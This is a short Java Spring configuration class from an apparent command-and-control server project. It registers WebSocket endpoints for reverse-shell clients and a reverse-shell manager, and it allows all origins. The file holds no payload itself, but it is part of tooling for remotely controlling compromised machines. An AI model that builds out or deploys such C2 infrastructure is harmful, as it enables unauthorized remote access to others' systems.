package com.mtattab.c2cServer.config;

import com.mtattab.c2cServer.controller.ReverseShellClientsHandler;
import com.mtattab.c2cServer.controller.ReverseShellManagerHandler;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.socket.config.annotation.EnableWebSocket;
import org.springframework.web.socket.config.annotation.WebSocketConfigurer;
import org.springframework.web.socket.config.annotation.WebSocketHandlerRegistry;

@Configuration
@EnableWebSocket
public class WebSocketConfig implements WebSocketConfigurer {

    @Autowired
    ReverseShellClientsHandler reverseShellClientsHandler;

    @Autowired
    ReverseShellManagerHandler reverseShellManagerHandler;

    @Override
    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
        registry.addHandler(reverseShellClientsHandler, "/reverseShellClients")
                .setAllowedOrigins("*")
                .addHandler(reverseShellManagerHandler, "/reverseShellManager"); // Configure allowed origins as needed
    }
}
